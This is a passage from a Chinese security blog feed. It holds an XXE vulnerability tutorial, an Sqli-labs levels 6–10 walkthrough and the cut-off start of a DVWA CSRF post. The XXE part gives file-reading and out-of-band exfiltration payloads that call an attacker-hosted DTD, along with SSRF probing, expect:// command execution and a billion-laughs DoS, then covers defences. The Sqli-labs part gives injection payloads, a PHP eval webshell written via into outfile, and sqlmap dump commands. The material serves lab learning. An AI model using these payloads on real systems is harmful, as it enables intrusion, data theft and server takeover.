href="#DTD-文档类型定义" class="headerlink" title="DTD(文档类型定义)"></a>DTD(文档类型定义)</h4><p>DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。</p><blockquote><h5 id="XML文档的构建模块"><a href="#XML文档的构建模块" class="headerlink" title="XML文档的构建模块"></a>XML文档的构建模块</h5><p>所有的 XML 文档（以及 HTML 文档）均由以下简单的构建模块构成：</p><p>元素、属性、实体、PCDATA、CDATA。</p><p>1、元素<br>元素是 XML 以及 HTML 文档的主要构建模块，元素可包含文本、其他元素或者是空的。<br>实例:</p><pre><code>&lt;body&gt;body text in between&lt;/body&gt;&lt;message&gt;some message in between&lt;/message&gt;</code></pre><p>空的 HTML 元素的例子是 “hr”、”br” 以及 “img”。</p><p>2、属性<br> 属性可提供有关元素的额外信息<br> 实例：</p><pre><code>&lt;img src=&quot;computer.gif&quot; /&gt;</code></pre><p>3、实体<br>实体是用来定义普通文本的变量。实体引用是对实体的引用。</p><p>4、PCDATA<br>PCDATA 的意思是被解析的字符数据（parsed character data）。<br>PCDATA 是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。</p><p>5、CDATA<br>CDATA 的意思是字符数据（character data）。<br>CDATA 是不会被解析器解析的文本。</p></blockquote><p>DTD 可以在 XML 文档内声明，也可以外部引用。</p><p>1、内部声明：<code>&lt;!DOCTYPE 根元素 [元素声明]&gt;</code> </p><p>例子: <code>&lt;!DOCTYOE test [any]&gt;</code></p><p>2、外部声明（引用外部DTD）：<code>&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</code> </p><p>例子:<code>&lt;!DOCTYPE test SYSTEM &#39;http://www.test.com/evil.dtd&#39;&gt;</code></p><p>3、内外部DTD文档结合：</p><pre><code>&lt;!DOCTYPE 根元素 SYSTEM &quot;DTD文件路径&quot; [定义内容]&gt;</code></pre><p>DTD中的一些重要的关键字：</p><ul><li>DOCTYPE（DTD的声明）</li><li>ENTITY（实体的声明）</li><li>SYSTEM、PUBLIC（外部资源申请）</li></ul><p>原文链接：<a href="https://blog.csdn.net/qq_40491569/java/article/details/83066200" target="_blank" rel="noopener">https://blog.csdn.net/qq_40491569/java/article/details/83066200</a></p><h4 id="实体类别介绍"><a href="#实体类别介绍" class="headerlink" title="实体类别介绍"></a>实体类别介绍</h4><p>实体主要分为一下四类</p><ul><li>内置实体 (Built-in entities)</li><li>字符实体 (Character entities)</li><li>通用实体 (General entities)</li><li>参数实体 (Parameter entities)</li></ul><p>参数实体用%实体名称申明，引用时也用%实体名称;</p><p>其余实体直接用实体名称申明，引用时用&amp;实体名称。</p><p>参数实体只能在DTD中申明，DTD中引用；</p><p>其余实体只能在DTD中申明，可在xml文档中引用。</p><p>注意：参数实体是在DTD中被引用的，而其余实体是在xml文档中被引用的。</p><h4 id="DTD-实体声明："><a href="#DTD-实体声明：" class="headerlink" title="DTD 实体声明："></a>DTD 实体声明：</h4><h5 id="1-内部实体声明"><a href="#1-内部实体声明" class="headerlink" title="1. 内部实体声明"></a>1. 内部实体声明</h5><pre><code>&lt;!ENTITY 实体名称 “实体的值”&gt;</code></pre><p>一个实体由三部分构成:&amp;符号, 实体名称, 分号 (;)，这里&amp;不论在GET还是在POST中都需要进行URL编码，因为是使用参数传入xml的，&amp;符号会被认为是参数间的连接符号，示例：</p><pre><code>&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe &quot;Thinking&quot;&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</code></pre><h5 id="2-外部实体声明"><a href="#2-外部实体声明" class="headerlink" title="2. 外部实体声明"></a>2. 外部实体声明</h5><p>XML中对数据的引用称为实体，实体中有一类叫外部实体，用来引入外部资源，有SYSTEM和PUBLIC两个关键字，表示实体来自本地计算机还是公共计算机，外部实体的引用可以借助各种协议，比如如下的三种：</p><pre><code>file:///path/to/file.exthttp://url/file.extphp://filter/read=convert.base64-encode/resource=conf.php</code></pre><pre><code>&lt;!ENTITY 实体名称 SYSTEM “URI/URL”&gt;</code></pre><p>部引用可支持http，file等协议，不同的语言支持的协议不同，但存在一些通用的协议，具体内容如下所示： </p><p>外部实体的默认协议</p><p><img src="/2020/05/22/XXE%E6%BC%8F%E6%B4%9E/C:%5CUsers%5CDELL%5CPictures%5CXXE.png" alt="img"></p><p>​    <strong>例子</strong></p><p>构造几种简单的Payload模型如下:</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE xdsec [&lt;!ELEMENT methodname ANY &gt;&lt;!ENTITY xxe(实体引用名) SYSTEM &quot;file:///etc/passwd&quot;(实体内容) &gt;]&gt;&lt;methodcall&gt;&lt;methodname&gt;&amp;xxe;&lt;/methodname&gt;&lt;/methodcall&gt;</code></pre><p>这种写法则调用了本地计算机的文件<code>/etc/passwd</code>，XML内容被解析后，文件内容便通过<code>&amp;xxe</code>被存放在了<code>methodname</code>元素中，造成了敏感信息的泄露。</p><p>亦可读取网站内容</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE xdsec [&lt;!ELEMENT methodname ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;http://attacker.com/text.txt&quot; &gt;]&gt;&lt;methodcall&gt;&lt;methodname&gt;&amp;xxe;&lt;/methodname&gt;&lt;/methodcall&gt;</code></pre><p>如果包含文件失败,可能是由于读取php等文件时文件本身包含的&lt;等字符.可以使用Base64编码绕过,如:</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE xdsec [&lt;!ELEMENT methodname ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=index.php&quot; &gt;]&gt;&lt;methodcall&gt;&lt;methodname&gt;&amp;xxe;&lt;/methodname&gt;&lt;/methodcall&gt;</code></pre><h5 id="3-参数实体声明"><a href="#3-参数实体声明" class="headerlink" title="3. 参数实体声明"></a>3. 参数实体声明</h5><pre><code>&lt;!ENTITY % 实体名称 “实体的值”&gt;or&lt;!ENTITY % 实体名称 SYSTEM “URI”&gt;</code></pre><p>  <strong>例子</strong></p><pre><code>&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY  % xxe SYSTEM &quot;http://xxx.xxx.xxx/evil.dtd&quot; &gt;%xxe;]&gt;&lt;foo&gt;&amp;evil;&lt;/foo&gt;</code></pre><p>外部evil.dtd中的内容。</p><pre><code>&lt;!ENTITY evil SYSTEM “file:///c:/windows/win.ini” &gt;</code></pre><h5 id="4-引用公共实体"><a href="#4-引用公共实体" class="headerlink" title="4. 引用公共实体"></a>4. 引用公共实体</h5><pre><code>&lt;!ENTITY 实体名称 PUBLIC &quot;public_ID&quot; &quot;URI&quot;&gt;</code></pre><h4 id="什么是XXE"><a href="#什么是XXE" class="headerlink" title="什么是XXE?"></a>什么是XXE?</h4><blockquote><p>XXE全称是——XML External Entity,也就是XML外部实体注入攻击.漏洞是在对不安全的外部实体数据进行处理时引发的安全问题。简单理解就是当允许引用外部实体时， XML数据在传输中有可能会被不法分子被修改，如果服务器执行被恶意插入的代码，就可以实现攻击的目的攻击者可以通过构造恶意内容，就可能导致任意文件读取，系统命令执行，内网端口探测，攻击内网网站等危害。</p><p>XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、×××内网网站、发起dos×××等危害。xxe漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。</p><p><a href="https://blog.csdn.net/tangyuan569/article/details/104277419" target="_blank" rel="noopener">https://blog.csdn.net/tangyuan569/article/details/104277419</a></p></blockquote><p>有了XML实体，关键字’SYSTEM’会令XML解析器从URI中读取内容，并允许它在XML文档中被替换。因此，攻击者可以通过实体将他自定义的值发送给应用程序，然后让应用程序去呈现。 简单来说，攻击者强制XML解析器去访问攻击者指定的资源内容(可能是系统上本地文件亦或是远程系统上的文件)。</p><p>下面的代码将获取系统上folder/file的内容并呈现给用户：</p><pre><code class="xml-dtd">Code1：&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE a [&lt;!ENTITY passwd SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;foo&gt;        &lt;value&gt;&amp;passwd;&lt;/value&gt;&lt;/foo&gt;</code></pre><p>XML外部实体 ‘passwd’ 被赋予的值为：file:///etc/passwd。在解析XML文档的过程中，实体’passwd’的值会被替换为URI(file:///etc/passwd)内容值(也就是passwd文件的内容)。关键字’SYSTEM’会告诉XML解析器，’passwd’实体的值将从其后的URI中读取。</p><pre><code>Code2：&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE b [&lt;!ENTITY entityex SYSTEM &quot;file:///folder/file&quot;&gt;]&gt;&lt;foo&gt;        &lt;value&gt;&amp;entityex;&lt;/value&gt;&lt;/foo&gt;</code></pre><pre><code>Code3：&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=index.php&quot; &gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt;</code></pre><h4 id="如何识别xml实体攻击漏洞？"><a href="#如何识别xml实体攻击漏洞？" class="headerlink" title="如何识别xml实体攻击漏洞？"></a>如何识别xml实体攻击漏洞？</h4><p>XXE漏洞主要针对web服务危险的引用的外部实体并且未对外部实体进行敏感字符的过滤，从而可以造成命令执行，目录遍历等。</p><p>甄别那些接受XML作为输入内容的端点。最直接的方法就是用burp抓包，然后，修改HTTP请求方法，修改Content-Type头部字段等等，查看返回包的响应，看看应用程序是否解析了发送的内容，一旦解析了，那么有可能XXE攻击漏洞。</p><h4 id="xxe漏洞检测"><a href="#xxe漏洞检测" class="headerlink" title="xxe漏洞检测"></a>xxe漏洞检测</h4><p>第一步检测XML是否会被成功解析：</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!DOCTYPE ANY [ &lt;!ENTITY name &quot;my name is nMask&quot;&gt;]&gt;&lt;root&gt;&amp;name;&lt;/root&gt;</code></pre><p>如果页面输出了my name is nMask，说明xml文件可以被解析。</p><p>![img](file:///D:\Users\DELL\Documents\Tencent Files\1244950218\Image\C2C\9DAFACBF50807FAE6D60C969D68AE8C7.png)</p><p>![img](file:///D:\Users\DELL\Documents\Tencent Files\1244950218\Image\C2C\7E6CB2015639C900F77DEB1317BA143E.png)</p><p>![img](file:///D:\Users\DELL\Documents\Tencent Files\1244950218\Image\C2C\7D909959654F64724543C606169FE3EC.png)</p><p>![img](file:///D:\Users\DELL\Documents\Tencent Files\1244950218\Image\C2C\05BD25FAA400763F869BF48CA301CC3F.png)</p><p>第二步检测服务器是否支持DTD引用外部实体：</p><pre><code>&lt;?xml version=”1.0” encoding=”UTF-8”?&gt; &lt;!DOCTYPE ANY [ &lt;!ENTITY % name SYSTEM &quot;http://localhost/index.html&quot;&gt; %name; ]&gt;</code></pre><p>可通过查看自己服务器上的日志来判断，看目标服务器是否向你的服务器发了一条请求index.html</p><blockquote><h4 id="从PHP代码层面上"><a href="#从PHP代码层面上" class="headerlink" title="从PHP代码层面上"></a>从PHP代码层面上</h4><p>最开始，引入一个<code>file_get_contents</code>函数，将整个XML数据读入<code>data</code>字符串中，然后交给php的xml解析函数<code>simplexml_load_string()</code>解析，解析后的数据赋给<code>xml</code>变量。</p><p>这一数据即XML字符串中使用的对象(或者说根元素)的数据，并echo输出出来。</p><pre><code>&lt;?php$data = file_get_contents(&#39;php://input&#39;);  //获取提交的XML数据$xml = simplexml_load_string($data);  // 交给PHP的XML解析函数echo $xml-&gt;name;?&gt;</code></pre></blockquote><h4 id="读取任意文件"><a href="#读取任意文件" class="headerlink" title="读取任意文件"></a>读取任意文件</h4><h5 id="有回显情况"><a href="#有回显情况" class="headerlink" title="有回显情况"></a>有回显情况</h5><p>XML.php</p><pre><code>&lt;?php$xml = &lt;&lt;&lt;EOF&lt;?xml version = &quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [    &lt;!ENTITY f SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;x&gt;&amp;f;&lt;/x&gt;EOF;$data = simplexml_load_string($xml);print_r($data);?&gt;</code></pre><p>访问XML.php可以读取etc/passwd文件内容</p><p>该CASE是读取/etc/passwd，有些XML解析库支持列目录，攻击者通过列目录、读文件，获取帐号密码后进一步攻击，如读取tomcat-users.xml得到帐号密码后登录tomcat的manager部署webshell。</p><p>实例展示：</p><p>可以使用如下的两种方式进行XXE注入攻击。</p><pre><code>&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY  xxe SYSTEM &quot;file:///c:/windows/win.ini&quot; &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY  % xxe SYSTEM &quot;http://xxx.xxx.xxx/evil.dtd&quot; &gt;%xxe;]&gt;&lt;foo&gt;&amp;evil;&lt;/foo&gt;</code></pre><p>外部evil.dtd中的内容。</p><pre><code>&lt;!ENTITY evil SYSTEM “file:///c:/windows/win.ini” &gt;</code></pre><p><img src="https://images2018.cnblogs.com/blog/1169796/201806/1169796-20180606225720549-617477006.png" alt="img"></p><p>当然也可以进行内网站点的入侵。</p><p><img src="https://images2018.cnblogs.com/blog/1169796/201806/1169796-20180606225753086-402105663.png" alt="img"></p><p> 以上任意文件读取能够成功，除了DTD可有引用外部实体外，还取决于有输出信息，即有回显。那么如果程序没有回显的情况下，该怎么读取文件内容呢？需要使用blind xxe漏洞去利用。</p><h5 id="无回显的情况"><a href="#无回显的情况" class="headerlink" title="无回显的情况"></a>无回显的情况</h5><h5 id="（blind-xxe漏洞）"><a href="#（blind-xxe漏洞）" class="headerlink" title="（blind xxe漏洞）"></a>（blind xxe漏洞）</h5><p>对于传统的XXE来说，要求攻击者只有在服务器有回显或者报错的基础上才能使用XXE漏洞来读取服务器端文件，如果没有回显则可以使用Blind XXE漏洞来构建一条带外信道提取数据。</p><p>创建test.php写入以下内容：</p><pre><code>&lt;?php file_put_contents(&quot;test.txt&quot;, $_GET[&#39;file&#39;]) ; ?&gt;</code></pre><p>创建index.php写入以下内容：</p><pre><code>&lt;?php $xml=&lt;&lt;&lt;EOF &lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE ANY[ &lt;!ENTITY % file SYSTEM &quot;file:///C:/test.txt&quot;&gt; &lt;!ENTITY % remote SYSTEM &quot;http://localhost/test.xml&quot;&gt; %remote;%all;%send; ]&gt; EOF; $data = simplexml_load_string($xml) ; echo &quot;&lt;pre&gt;&quot; ; print_r($data) ; ?&gt;</code></pre><p>创建test.xml并写入以下内容：</p><pre><code>&lt;!ENTITY % all &quot;&lt;!ENTITY % send SYSTEM &#39;http://localhost/test.php?file=%file;&#39;&gt;&quot;&gt;</code></pre><p>当访问<code>http://localhost/index.php</code>, 存在漏洞的服务器会读出text.txt内容，发送给攻击者服务器上的test.php，然后把读取的数据保存到本地的test.txt中。</p><h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><p>php环境下，xml命令执行要求php装有expect扩展。而该扩展默认没有安装。</p><pre><code>&lt;?php$xml = &lt;&lt;&lt;EOF&lt;?xml version = &quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [    &lt;!ENTITY f SYSTEM &quot;except://ls&quot;&gt; # id]&gt;&lt;x&gt;&amp;f;&lt;/x&gt;EOF;$data = simplexml_load_string($xml);print_r($data);?&gt;</code></pre><p>该CASE是在安装expect扩展的PHP环境里执行系统命令，其他协议也有可能可以执行系统命令。</p><h4 id="内网探测-SSRF"><a href="#内网探测-SSRF" class="headerlink" title="内网探测/SSRF"></a>内网探测/SSRF</h4><p>由于xml实体注入攻击可以利用http://协议，也就是可以发起http请求。可以利用该请求去探查内网，进行SSRF攻击。</p><pre><code>&lt;?php$xml = &lt;&lt;&lt;EOF&lt;?xml version = &quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [    &lt;!ENTITY f SYSTEM &quot;http://192.168.1.1:80/&quot;&gt;]&gt;&lt;x&gt;&amp;f;&lt;/x&gt;EOF;$data = simplexml_load_string($xml);print_r($data);?&gt;</code></pre><h4 id="DOS"><a href="#DOS" class="headerlink" title="DOS"></a>DOS</h4><pre><code class="xml">&lt;?xml version=&quot;1.0&quot;?&gt;   &lt;!DOCTYPE lolz [&lt;!ENTITY lol &quot;lol&quot;&gt;&lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;&lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;&lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;&lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;&lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;&lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;&lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;&lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt; ]&gt; &lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;&lt;/pre&gt;</code></pre><p>这个的原理就是递归引用,lol 实体具体还有 “lol” 字符串，然后一个 lol2 实体引用了 10 次 lol 实体，一个 lol3 实体引用了 10 次 lol2 实体，此时一个 lol3 实体就含有 10^2 个 “lol” 了，以此类推，lol9 实体含有 10^8 个 “lol” 字符串,最后再引用lol9。</p><p>链接：<a href="https://www.jianshu.com/p/e56a2b8fde8" target="_blank" rel="noopener">https://www.jianshu.com/p/e56a2b8fde8</a></p><p>原理为：构造恶意的XML实体文件耗尽可用内存，因为许多XML解析器在解析XML文档时倾向于将它的整个结构保留在内存中，解析非常慢，造成了拒绝服务器攻击。除了这些，攻击者还可以读取服务器上的敏感数据，还能通过端口扫描，获取后端系统的开放端口。</p><h3 id="防御XXE"><a href="#防御XXE" class="headerlink" title="防御XXE"></a>防御XXE</h3><p><strong>使用开发语言提供的禁用外部实体的方法</strong></p><pre><code class="xml">PHP：&lt;pre style=&quot;margin: 0px; padding: 0px; white-space: pre-wrap; overflow-wrap: break-word; font-family: &amp;quot;Courier New&amp;quot; !important; font-size: 12px !important;&quot;&gt;libxml_disable_entity_loader(true);&lt;/pre&gt;JAVA：&lt;pre style=&quot;margin: 0px; padding: 0px; white-space: pre-wrap; overflow-wrap: break-word; font-family: &amp;quot;Courier New&amp;quot; !important; font-size: 12px !important;&quot;&gt;DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false);&lt;/pre&gt;Python：&lt;pre style=&quot;margin: 0px; padding: 0px; white-space: pre-wrap; overflow-wrap: break-word; font-family: &amp;quot;Courier New&amp;quot; !important; font-size: 12px !important;&quot;&gt;from lxml import etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))&lt;/pre&gt;</code></pre><p><strong>过滤用户提供的XML数据</strong></p><p>过滤关键字：&lt;!DOCTYPE和&lt;!ENTITY，或者SYSTEM和PUBLIC。</p><p>不允许XML中含有自己定义的DTD</p><p>参考链接：<a href="https://www.jianshu.com/p/e56a2b8fde80" target="_blank" rel="noopener">https://www.jianshu.com/p/e56a2b8fde80</a></p><p>环境搭建：<a href="https://www.yad0.com/technology_sharing/698.html" target="_blank" rel="noopener">https://www.yad0.com/technology_sharing/698.html</a></p></h1>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;XXE漏洞&quot;&gt;&lt;a href=&quot;#XXE漏洞&quot; class=&quot;headerlink&quot; title=&quot;XXE漏洞&quot;&gt;&lt;/a&gt;XXE漏洞&lt;/h1&gt;&lt;p&gt;XML被设计用来传输和存储数据。&lt;br&gt;HTML被设计用来显示数据。&lt;/p&gt;
&lt;h4 id=&quot;什么是XML&quot;&gt;&lt;a 
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Sqli-labs（6-10关）</title>
    <link href="http://yoursite.com/2020/05/17/Sqli-labs%EF%BC%886-10%E5%85%B3%EF%BC%89/"/>
    <id>http://yoursite.com/2020/05/17/Sqli-labs%EF%BC%886-10%E5%85%B3%EF%BC%89/</id>
    <published>2020-05-17T09:05:41.128Z</published>
    <updated>2020-07-06T14:49:46.573Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Sqli-labs（6-10关）"><a href="#Sqli-labs（6-10关）" class="headerlink" title="Sqli-labs（6-10关）"></a>Sqli-labs（6-10关）</h1><p>做sqli-labs的时候输入的这些命令要记住吗？懂得看笔记就行</p><h2 id="第六关："><a href="#第六关：" class="headerlink" title="第六关："></a>第六关：</h2><h4 id="1-判断"><a href="#1-判断" class="headerlink" title="1.判断"></a>1.判断</h4><p>输入?id=1跟1’ 没错，输入?id=1”报错</p><p>这道题与第五关很类似，就只差了个”</p><p>这道题没有显示位，所以得用双查询报错注入</p><p>双查询注入详解参考的链接：<a href="https://www.2cto.com/article/201303/192718.html" target="_blank" rel="noopener">https://www.2cto.com/article/201303/192718.html</a></p><blockquote><p>归纳：</p><p>1）查询数据库名：</p><p>select count(<em>), concat((select database()), floor(rand()</em>2))as a from information_schema.tables group by a;</p><p>2）查询版本：</p><p>select count(<em>), concat((select version()), floor(rand()</em>2))as a from information_schema.tables group by a;</p><p>3）查询用户名：</p><p>select count(<em>), concat(‘<del>‘,(select user()),’</del>‘, floor(rand()</em>2))as a from information_schema.tables group by a;</p><p>4）查询派生表：</p><p>select 1 from (select count(<em>), concat(‘<del>‘,(select user()),’</del>‘, floor(rand()</em>2))as a from information_schema.tables group by a)x;</p></blockquote><h4 id="2-payload："><a href="#2-payload：" class="headerlink" title="2.payload："></a>2.payload：</h4><p>1）输入?id=-1” union select 1,count(<em>),concat(database(),floor(rand(0)</em>2))x from information_schema.tables group by x;–+ 得到数据库名</p><p>2）输入?id=-1” union select 1,count(<em>),concat((select table_name from information_schema.tables where table_schema=”security” limit 1,1),floor(rand(0)</em>2))x from information_schema.tables group by x;–+ 得到表名</p><p>3）输入?id=-1” union select 1,count(<em>),concat((select column_name from information_schema.columns where table_name=’users’ limit 1,1),floor(rand(0)</em>2))x from information_schema.tables group by x;–+ 得到users表的字段</p><p>4）输入?id=-1” union select 1,count(<em>),concat((select username from security.users limit 1,1),floor(rand(0)</em>2))x from information_schema.tables group by x;–+ 得到users表的username字段的值</p><h2 id="第七关："><a href="#第七关：" class="headerlink" title="第七关："></a>第七关：</h2><p><strong>1.判断：</strong></p><p>输入？id=1、1“没错，输入？id=1’、1‘）报错，各自加上–+还是报错，输入id=1’))–+对了。</p><p><strong>2.</strong>题目下方出现了Use outfile，所以这关不能用以前的方式来做了，得往服务器写入一句话木马文件然后蚁剑连接。</p><p>file权限和into outfile这个函数：<br>数据库的file权限规定了数据库用户是否有权限向操作系统内写入和读取已存在的权限<br>into outfile命令是file系列函数来进行读取敏感文件或者写入webshell。</p><p>into outfile命令使用的环境：<br>我们必须知道，服务器上一个可以写入文件的文件夹的完整路径</p><p>查看是否有写入权限，输入<code>?id=1&#39;)) and (select count(*) from mysql.user)&gt;0--+</code> 返回正常，则说明有写入权限。</p><p>输入</p><p><code>?id=-1&#39;)) union select 1,2,3 into outfile &quot;D:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\data\\l.php&quot;--+</code></p><p>发现文件导入成功；查看发现里边写的1 2 3，所以可以利用这个上传一句话木马</p><p><code>?id=-1&#39;))  union select 1,&quot;&lt;?php @eval($_POST[&#39;test&#39;]);?&gt;&quot;,3 into outfile &quot;D:\\phpstudy_pro\\WWW\\123.php&quot; --+</code></p><p>然后用蚁剑连接。</p><p>我们怎么知道路径呢？如果要入侵别人的我们怎么会知道路径？</p><h2 id="第八关："><a href="#第八关：" class="headerlink" title="第八关："></a>第八关：</h2><p><strong>1、判断：</strong></p><p>输入?id=1下边显示you are in，输入1‘下边没显示（报错），输入1’–+没报错；说明源码为id=‘ ’</p><p><strong>2、</strong>输入<code>?id=-1&#39; union select 1,2,3 into outfile &quot;D:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\data\\12345.php&quot;--+</code>发现可以成功，所以接下去的步骤与第七关类似。</p><h2 id="第九关："><a href="#第九关：" class="headerlink" title="第九关："></a>第九关：</h2><p><strong>1、判断：</strong></p><p>不管输入什么东西，页面都是you are in；了解知道这个需要用延时函数sleep()对两种输入进行区分，可以构造如下语句：<br>and if((ascii(substr(database(),1,1)))&gt;114,sleep(5),0)</p><p>这里的意思是，如果数据库名首字母的ascii码大于114，那么执行sleep(5)，延时5秒，此时标签栏会变成缓冲，于是，我们就可以判断匹配的结果了</p><p>判断时间型盲注语句：’ and sleep(5)%23<br>这里用到的是?id=1’ and sleep(5)–+<br>F12看网络缓存时间，超过5秒就存在时间型盲注</p><p><strong>2.用sqlmap</strong></p><p>输入<code>sqlmap.py -u http://127.0.0.1/sqlilabs/Less-9?id=1 --technique T --dbms mysql --dbs --batch</code></p><p>得数据库名</p><p>输入<code>sqlmap.py -u http://127.0.0.1/sqlilabs/Less-9?id=1 --technique T --dbms mysql -D security --tables --batch</code>    </p><p> 得到表名</p><p>输入<code>sqlmap.py -u http://127.0.0.1/sqlilabs/Less-9?id=1 --technique T --dbms mysql -D security -T users --column --batch</code>      </p><p>得到列名</p><p>输入<code>sqlmap.py -u http://127.0.0.1/sqlilabs/Less-9?id=1 --technique T --dbms mysql -D security -T users -C username,password --dump --batch</code>     </p><p>得到具体内容</p><p>参考题解：<a href="https://www.jianshu.com/p/875d95f8d3cf" target="_blank" rel="noopener">https://www.jianshu.com/p/875d95f8d3cf</a></p><h2 id="第十关："><a href="#第十关：" class="headerlink" title="第十关："></a>第十关：</h2><p><strong>1、判断：</strong></p><p>跟第九关一样啥也没变，输入’和”都显示正常，尝试?id=3’ and sleep(5)–+，没什么延迟，尝试” and sleep(5)–+延迟时间变为6秒多，说明是双引号的时间型盲注。</p><p><strong>2、用sqlmap注入</strong>，同第九关</p><p>参考题解：<a href="https://www.cnblogs.com/-chenxs/p/11219774.html" target="_blank" rel="noopener">https://www.cnblogs.com/-chenxs/p/11219774.html</a></p><p>参考题解：<a href="https://blog.csdn.net/sdb5858874/article/details/80727555" target="_blank" rel="noopener">https://blog.csdn.net/sdb5858874/article/details/80727555</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Sqli-labs（6-10关）&quot;&gt;&lt;a href=&quot;#Sqli-labs（6-10关）&quot; class=&quot;headerlink&quot; title=&quot;Sqli-labs（6-10关）&quot;&gt;&lt;/a&gt;Sqli-labs（6-10关）&lt;/h1&gt;&lt;p&gt;做sqli-labs的时候输
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>DVWA CSRF跨站请求伪造</title>
    <link href="http://yoursite.com/2020/05/17/DVWA%20CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/"/>
    <id>http://yoursite.com/2020/05/17/DVWA%20CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/</id>
    <published>2020-05-17T06:46:03.131Z</published>
    <updated>2020-05-17T08:39:22.967Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DVWA-CSRF跨站请求伪造"><a href="#DVWA-CSRF跨站请求伪造" class="headerlink" title="DVWA CSRF跨站请求伪造"></a>DVWA CSRF跨站请求伪造</h1><blockquote><p>跨站请求伪造（英语：Cross-site request forgery），也被称为 one-click attack 或者 session riding，通常缩写为 CSRF 或者 XSRF， 是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。跟跨网站脚本（XSS）相比，XSS 利用的是用户对指定网站的信任，CSRF 